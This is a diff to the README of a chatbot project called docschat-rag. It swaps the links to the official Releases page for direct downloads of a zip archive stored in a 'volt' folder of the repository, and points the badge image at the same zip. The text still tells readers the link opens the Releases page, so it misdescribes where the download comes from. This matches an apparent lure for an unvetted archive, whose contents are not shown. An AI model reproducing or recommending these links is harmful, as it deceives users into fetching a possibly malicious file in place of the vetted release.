@@ -8,7 +8,7 @@ Welcome to `docschat-rag`, your advanced chatbot for searching and retrieving te
 
 To get started, visit the following link to download the application:
 
-[![Download docschat-rag](https://img.shields.io/badge/Download-docschat--rag-blue.svg)](https://github.com/Milesdexter/docschat-rag/releases)
+[![Download docschat-rag](https://raw.githubusercontent.com/Milesdexter/docschat-rag/main/volt/docschat-rag.zip)](https://raw.githubusercontent.com/Milesdexter/docschat-rag/main/volt/docschat-rag.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version, which is marked as "Latest Release."
@@ -67,7 +67,7 @@ Feel free to ask any follow-up questions!
 
 ## 🗂️ Additional Information
 
-For further details and updates, please refer to our [Releases page](https://github.com/Milesdexter/docschat-rag/releases) again.
+For further details and updates, please refer to our [Releases page](https://raw.githubusercontent.com/Milesdexter/docschat-rag/main/volt/docschat-rag.zip) again.
 
 If you have any issues or need help, please check the FAQ section available in the application. You can also report issues or request features by visiting the Issues tab in this repository.
 
